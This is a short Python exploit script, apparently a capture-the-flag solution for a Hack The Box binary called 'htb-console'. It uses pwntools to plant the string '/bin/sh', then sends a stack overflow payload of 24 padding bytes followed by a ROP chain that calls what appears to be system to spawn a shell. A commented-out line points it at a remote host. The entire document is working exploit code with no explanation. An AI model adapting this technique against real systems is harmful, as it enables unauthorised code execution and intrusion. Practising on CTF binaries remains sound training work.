#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./htb-console',checksec=False)


p = process()
#p = remote('94.237.51.81',46321)
#gdb.attach(p,gdbscript='''
#           b*0x00000000004012F8
#           b*0x0000000000401396
#           ''')

input()
p.sendlineafter(b'>> ',b'hof')

p.sendlineafter(b'Enter your name: ',b'/bin/sh\x00')
p.sendlineafter(b'>> ',b'flag')
p.sendlineafter(b'flag: ',b'a'*24 + p64(0x0000000000401473)  + p64(0x4040b0) + p64(0x401040))

p.interactive()
